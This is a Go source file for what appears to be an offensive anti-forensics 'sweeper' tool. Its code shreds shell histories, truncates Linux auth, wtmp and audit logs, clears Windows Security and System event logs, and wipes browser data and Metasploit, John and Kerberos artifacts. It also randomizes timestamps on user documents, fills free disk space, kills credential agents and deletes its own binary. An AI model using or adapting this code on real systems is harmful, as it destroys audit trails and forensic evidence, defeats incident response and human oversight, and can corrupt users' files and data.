package sweeper

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// ── Shared utilities ────────────────────────────────────────────

func expand(path string) string {
	if strings.HasPrefix(path, "~") {
		home, _ := os.UserHomeDir()
		return filepath.Join(home, path[1:])
	}
	return path
}

func home() string {
	h, _ := os.UserHomeDir()
	return h
}

func exists(path string) bool {
	_, err := os.Stat(expand(path))
	return err == nil
}

func section(name, desc string) {
	fmt.Printf("\n  [*] %s\n      %s\n", name, desc)
}

func okMsg(msg string) {
	fmt.Printf("  [+] %s\n", msg)
}

func warnMsg(msg string) {
	fmt.Printf("  [!] %s\n", msg)
}

// ── Shredding ───────────────────────────────────────────────────

func wipeFile(path string, passes int) error {
	path = expand(path)
	info, err := os.Stat(path)
	if err != nil {
		return err
	}

	f, err := os.OpenFile(path, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	size := info.Size()
	buf := make([]byte, 4096)

	for pass := 0; pass < passes; pass++ {
		f.Seek(0, 0)
		written := int64(0)
		for written < size {
			n := int64(len(buf))
			if size-written < n {
				n = size - written
			}
			// Fill with pass-specific pattern
			fillPattern(buf[:n], pass)
			_, err := f.Write(buf[:n])
			if err != nil {
				break
			}
			written += n
		}
		f.Sync()
	}
	f.Close()
	return os.Remove(path)
}

func fillPattern(b []byte, pass int) {
	switch pass {
	case 0:
		for i := range b {
			b[i] = 0x55
		}
	case 1:
		for i := range b {
			b[i] = 0xAA
		}
	case 2:
		for i := range b {
			b[i] = 0xFF
		}
	default:
		for i := range b {
			b[i] = byte(time.Now().UnixNano() % 256)
		}
	}
}

func truncateFile(path string) error {
	path = expand(path)
	return os.Truncate(path, 0)
}

// ── Shell Histories ─────────────────────────────────────────────

func (s *Sweeper) sweepShells() {
	section("SHELL HISTORIES", "bash, zsh, fish, PowerShell, cmd, mysql, psql, python, node")

	var files []string

	switch s.target {
	case "linux":
		files = []string{
			"~/.bash_history", "~/.zsh_history", "~/.zhistory",
			"~/.fish_history", "~/.mysql_history", "~/.psql_history",
			"~/.python_history", "~/.node_repl_history",
			"~/.lesshst", "~/.wget-hsts",
			"~/.local/share/fish/fish_history",
			"/root/.bash_history",
		}
	case "windows":
		files = []string{
			filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"),
			filepath.Join(home(), "AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"),
		}
	}

	count := 0
	for _, f := range files {
		if !exists(f) {
			continue
		}
		if s.cfg.DryRun {
			fmt.Printf("  [DRY] Would wipe: %s\n", f)
		} else {
			wipeFile(f, s.cfg.Passes)
		}
		count++
		s.audit.Log("SHELL: %s", f)
	}

	// Clear in-memory history
	if s.target == "linux" {
		os.Setenv("HISTFILE", "/dev/null")
		os.Setenv("HISTSIZE", "0")
		os.Setenv("HISTFILESIZE", "0")
	} else {
		// Clear PowerShell history via registry hint
		psHistory := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
		os.WriteFile(psHistory, []byte{}, 0644)
	}

	okMsg(fmt.Sprintf("Shell traces erased (%d files)", count))
}

// ── System Logs (Linux) ─────────────────────────────────────────

func (s *Sweeper) sweepLogs() {
	if s.target != "linux" {
		return
	}
	section("SYSTEM LOGS", "auth, syslog, journald, firewall, web server")

	logs := []string{
		"/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
		"/var/log/secure", "/var/log/kern.log", "/var/log/boot.log",
		"/var/log/daemon.log", "/var/log/dpkg.log",
		"/var/log/apt/history.log", "/var/log/apt/term.log",
		"/var/log/ufw.log", "/var/log/fail2ban.log",
		"/var/log/btmp", "/var/log/lastlog", "/var/log/wtmp",
		"/var/log/audit/audit.log", "/var/log/tor/log",
	}

	for _, l := range logs {
		if !exists(l) {
			continue
		}
		if s.cfg.DryRun {
			fmt.Printf("  [DRY] Would truncate: %s\n", l)
		} else {
			truncateFile(l)
		}
		s.audit.Log("LOG: %s", l)
	}

	// Journald vacuum
	runCmd("journalctl", "--vacuum-time=1d")
	runCmd("journalctl", "--rotate")

	okMsg("System logs sanitized")
}

// ── Temp & Caches ───────────────────────────────────────────────

func (s *Sweeper) sweepTemp() {
	section("TEMP & CACHES", "tmp files, thumbnails, trash, clipboard")

	var dirs []string
	switch s.target {
	case "linux":
		dirs = []string{
			"/tmp", "/var/tmp", "/dev/shm",
			"~/.cache/thumbnails", "~/.cache/pip", "~/.cache/mozilla",
			"~/.cache/chromium", "~/.cache/google-chrome",
			"~/.thumbnails", "~/.local/share/Trash",
			"~/.local/share/recently-used.xbel",
		}
	case "windows":
		dirs = []string{
			filepath.Join(os.Getenv("TEMP")),
			filepath.Join(os.Getenv("WINDIR"), "Temp"),
			filepath.Join(home(), "AppData\\Local\\Temp"),
			filepath.Join(home(), "AppData\\Local\\Microsoft\\Windows\\INetCache"),
			filepath.Join(home(), "Recent"),
		}
	}

	systemDirs := map[string]bool{"/tmp": true, "/var/tmp": true, "/dev/shm": true}
	for _, d := range dirs {
		d = expand(d)
		if s.cfg.DryRun {
			fmt.Printf("  [DRY] Would purge: %s\n", d)
			continue
		}
		if systemDirs[d] {
			filepath.Walk(d, func(path string, info os.FileInfo, err error) error {
				if err != nil || path == d {
					return nil
				}
				if !info.IsDir() {
					os.Remove(path)
				}
				return nil
			})
		} else {
			os.RemoveAll(d)
		}
		s.audit.Log("TEMP: %s", d)
	}
	okMsg("Temp & caches purged")
}

// ── Browser Data ─────────────────────────────────────────────────

func (s *Sweeper) sweepBrowsers() {
	section("BROWSER DATA", "Firefox, Chrome, Edge histories, cookies, caches")

	type browserPath struct {
		name string
		path string
	}

	var browsers []browserPath

	if s.target == "linux" {
		browsers = []browserPath{
			{"Firefox", "~/.mozilla/firefox"},
			{"Chromium", "~/.config/chromium"},
			{"Chrome", "~/.config/google-chrome"},
			{"Brave", "~/.config/brave-browser"},
			{"Edge", "~/.config/microsoft-edge"},
		}
	} else {
		local := filepath.Join(home(), "AppData", "Local")
		roaming := filepath.Join(home(), "AppData", "Roaming")
		browsers = []browserPath{
			{"Chrome", filepath.Join(local, "Google", "Chrome")},
			{"Edge", filepath.Join(local, "Microsoft", "Edge")},
			{"Brave", filepath.Join(local, "BraveSoftware", "Brave-Browser")},
			{"Firefox", filepath.Join(roaming, "Mozilla", "Firefox")},
		}
	}

	wipeItems := []string{"History", "Cookies", "Login Data", "Web Data",
		"Cache", "Code Cache", "Service Worker", "Session Storage",
		"Local Storage", "IndexedDB", "places.sqlite", "cookies.sqlite",
		"formhistory.sqlite", "downloads.sqlite"}

	for _, br := range browsers {
		p := expand(br.path)
		if !exists(p) {
			continue
		}

		// Walk profile directories
		entries, _ := os.ReadDir(p)
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			profileDir := filepath.Join(p, entry.Name())
			for _, item := range wipeItems {
				target := filepath.Join(profileDir, item)
				if exists(target) {
					if s.cfg.DryRun {
						fmt.Printf("  [DRY] Would wipe: %s\n", target)
					} else {
						os.RemoveAll(target)
					}
					s.audit.Log("BROWSER: %s/%s", br.name, item)
				}
			}
		}
		okMsg(fmt.Sprintf("%s sanitized", br.name))
	}
}

// ── Network Traces ──────────────────────────────────────────────

func (s *Sweeper) sweepNetwork() {
	section("SSH & NETWORK", "known_hosts, DNS, ARP, Wi-Fi")

	if s.target == "linux" {
		sshFiles := []string{"~/.ssh/known_hosts", "~/.ssh/known_hosts.old"}
		for _, f := range sshFiles {
			if exists(f) {
				if s.cfg.DryRun {
					fmt.Printf("  [DRY] Would wipe: %s\n", f)
				} else {
					wipeFile(f, s.cfg.Passes)
				}
				s.audit.Log("SSH: %s", f)
			}
		}
		runCmd("resolvectl", "flush-caches")
		runCmd("ip", "-s", "-s", "neigh", "flush", "all")
	} else {
		runCmd("ipconfig", "/flushdns")
		runCmd("arp", "-d", "*")
	}
	okMsg("Network traces cleaned")
}

// ── Tool Artifacts ──────────────────────────────────────────────

func (s *Sweeper) sweepArtifacts() {
	section("TOOL ARTIFACTS", "MSF, Burp, John, Hashcat, Impacket, Nmap, Docker, Git")

	var artifacts []string
	if s.target == "linux" {
		artifacts = []string{
			"~/.msf4/history", "~/.msf4/logs", "~/.msf4/loot",
			"~/.msf4/local", "~/.msf4/store", "~/.msf4/notes",
			"~/.john/john.pot", "~/.john/john.log",
			"~/.hashcat/hashcat.potfile", "~/.hashcat/sessions",
			"~/.nmap", "~/.cme/logs", "~/.cme/workspaces",
			"~/.BurpSuite", "~/.java/.userPrefs",
			"~/.docker/config.json", "~/.git-credentials",
			"~/.viminfo", "~/.nano_history",
			"/tmp/hydra.restore", "/tmp/ccache_*", "/tmp/krb5cc_*",
			"~/.impacket", "/tmp/nc.*", "/tmp/rev.*",
		}
	} else {
		artifacts = []string{
			filepath.Join(home(), "AppData\\Local\\Temp\\*"),
			filepath.Join(home(), "AppData\\Roaming\\nmap"),
			filepath.Join(os.Getenv("USERPROFILE"), ".msf4"),
		}
	}

	for _, a := range artifacts {
		a = expand(a)
		matches, _ := filepath.Glob(a)
		if len(matches) == 0 && !exists(a) {
			continue
		}
		targets := matches
		if len(targets) == 0 {
			targets = []string{a}
		}
		for _, t := range targets {
			if s.cfg.DryRun {
				fmt.Printf("  [DRY] Would remove: %s\n", t)
			} else {
				os.RemoveAll(t)
			}
			s.audit.Log("ARTIFACT: %s", t)
		}
	}
	okMsg("Application & tool artifacts wiped")
}

// ── Memory ──────────────────────────────────────────────────────

func (s *Sweeper) sweepMemory() {
	section("MEMORY & SWAP", "page cache, swap rotation")
	if s.cfg.DryRun {
		okMsg("[DRY] Would flush memory caches")
		return
	}
	if s.target == "linux" {
		os.WriteFile("/proc/sys/vm/drop_caches", []byte("3\n"), 0)
		runCmd("swapoff", "-a")
		runCmd("swapon", "-a")
	}
	okMsg("Memory caches flushed")
}

// ── Timestamps ──────────────────────────────────────────────────

func (s *Sweeper) sweepTimestamps() {
	section("FILE TIMESTAMPS", "Randomizing modification times")
	if s.cfg.DryRun {
		okMsg("[DRY] Would randomize timestamps")
		return
	}

	dirs := []string{}
	switch s.target {
	case "linux":
		dirs = []string{expand("~/Desktop"), expand("~/Documents"), expand("~/Downloads")}
	case "windows":
		dirs = []string{
			filepath.Join(home(), "Desktop"),
			filepath.Join(home(), "Documents"),
			filepath.Join(home(), "Downloads"),
		}
	}

	seed := time.Now().UnixNano()
	for _, dir := range dirs {
		if !exists(dir) {
			continue
		}
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			seed ^= seed << 13
			seed ^= seed >> 7
			seed ^= seed << 17
			days := time.Duration(int(seed%180)+1) * 24 * time.Hour
			seed ^= seed << 13
			seed ^= seed >> 7
			seed ^= seed << 17
			hours := time.Duration(int(seed%24)) * time.Hour
			mins := time.Duration(int(seed%60)) * time.Minute
			newTime := time.Now().Add(-days - hours - mins)
			os.Chtimes(path, newTime, newTime)
			return nil
		})
	}
	okMsg("Timestamps randomized")
}

// ── Free Space ──────────────────────────────────────────────────

func (s *Sweeper) sweepFreeSpace() {
	section("FREE SPACE", "Overwriting unallocated disk blocks")
	if s.cfg.DryRun {
		okMsg("[DRY] Would fill free space")
		return
	}

	dirs := []string{"/tmp"}
	if home := home(); home != "" {
		dirs = append(dirs, home)
	}

	for _, dir := range dirs {
		filler := filepath.Join(dir, ".cs_free_fill")
		f, err := os.Create(filler)
		if err != nil {
			continue
		}
		// Write random data until disk full
		buf := make([]byte, 1024*1024) // 1MB chunks
		for i := 0; i < 10000; i++ {
			for j := range buf {
				buf[j] = byte(time.Now().UnixNano() % 256)
			}
			if _, err := f.Write(buf); err != nil {
				break
			}
		}
		f.Close()
		if s.cfg.Passes > 3 {
			wipeFile(filler, 1)
		} else {
			os.Remove(filler)
		}
		s.audit.Log("FREE-SPACE: %s", dir)
	}
	s.ssdTrim()
}

// ── SSD TRIM ────────────────────────────────────────────────────

func (s *Sweeper) ssdTrim() {
	if runtime.GOOS == "linux" {
		runCmd("fstrim", "-a")
	}
}

// ── Process Memory, Core Dumps, Connections (Linux only) ────────

func (s *Sweeper) sweepProcessMemory() {
	if s.target != "linux" {
		return
	}
	section("PROCESS MEMORY", "ssh-agent, gpg-agent, keyring")
	if s.cfg.DryRun {
		okMsg("[DRY] Would scrub process memory")
		return
	}
	runCmd("pkill", "-9", "ssh-agent")
	runCmd("gpgconf", "--kill", "gpg-agent")
	runCmd("killall", "-9", "gnome-keyring-daemon")
	okMsg("Process agents killed")
}

func (s *Sweeper) sweepCoreDumps() {
	if s.target != "linux" {
		return
	}
	section("CORE DUMPS", "systemd coredump, /var/crash")
	if s.cfg.DryRun {
		okMsg("[DRY] Would purge core dumps")
		return
	}
	os.RemoveAll("/var/lib/systemd/coredump")
	os.RemoveAll("/var/crash")
	okMsg("Core dumps purged")
}

func (s *Sweeper) sweepConnections() {
	if s.target != "linux" {
		return
	}
	section("LIVE CONNECTIONS", "Teardown interactive sockets")
	if s.cfg.DryRun {
		okMsg("[DRY] Would teardown connections")
		return
	}
	// Kill netcat, reverse shells, browsers
	runCmd("pkill", "-f", "nc ")
	runCmd("pkill", "-f", "ncat")
	runCmd("pkill", "-f", "chrome")
	runCmd("pkill", "-f", "firefox")
	okMsg("Interactive connections terminated")
}

// ── Windows-Specific ────────────────────────────────────────────

func (s *Sweeper) sweepEventLog() {
	if s.target != "windows" {
		return
	}
	section("WINDOWS EVENT LOG", "Security, System, Application")
	if s.cfg.DryRun {
		okMsg("[DRY] Would clear event logs")
		return
	}
	runCmd("wevtutil", "cl", "Security")
	runCmd("wevtutil", "cl", "System")
	runCmd("wevtutil", "cl", "Application")
	runCmd("wevtutil", "cl", "Windows PowerShell")
	okMsg("Event logs cleared")
}

func (s *Sweeper) sweepPrefetch() {
	if s.target != "windows" {
		return
	}
	section("PREFETCH", "Windows prefetch files")
	prefetchDir := filepath.Join(os.Getenv("WINDIR"), "Prefetch")
	if s.cfg.DryRun {
		okMsg("[DRY] Would clear prefetch")
		return
	}
	os.RemoveAll(prefetchDir)
	os.MkdirAll(prefetchDir, 0755)
	okMsg("Prefetch cleared")
}

func (s *Sweeper) sweepRegistry() {
	if s.target != "windows" {
		return
	}
	section("REGISTRY", "Shellbags, UserAssist, RunMRU")
	if s.cfg.DryRun {
		okMsg("[DRY] Would clear registry traces")
		return
	}
	// Delete RunMRU (recent Run commands)
	runCmd("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "/va", "/f")
	okMsg("Registry traces cleaned")
}

// ── Self-Destruct ───────────────────────────────────────────────

func (s *Sweeper) selfDestruct() {
	section("SELF-DESTRUCT", "Removing binary from system")
	exe, _ := os.Executable()
	if exe != "" {
		if s.cfg.Passes > 3 {
			wipeFile(exe, s.cfg.Passes)
		} else {
			os.Remove(exe)
		}
		s.audit.Log("SELF-DESTRUCT: %s", exe)
		okMsg("Binary removed from system")
	}
}

// ── Command Runner ──────────────────────────────────────────────

// runCmd is defined in audit.go
